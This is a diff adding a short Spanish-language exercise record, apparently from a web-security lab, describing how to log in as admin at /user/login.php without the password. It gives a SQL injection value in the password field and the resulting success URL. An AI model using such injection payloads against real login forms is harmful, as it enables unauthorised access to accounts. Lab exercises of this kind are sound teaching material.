@@ -1,0 +1,18 @@
+Ejercicio: 3
+
+Objetivo:
+    Identificarnos como admin sin conocer la clave
+
+Punto de entrada:
+    /user/login.php
+
+Datos:
+    User: admin
+    Password: 1234' OR '1'=='1
+
+URL:
+    /index.php?infoMessage=User+%27Administrador%27+%28admin%29+successfully+logged+in
+
+Identificador:
+    20210426-155331 d507f35a564e1b7a1ea9cf7bdb0ca8af
+
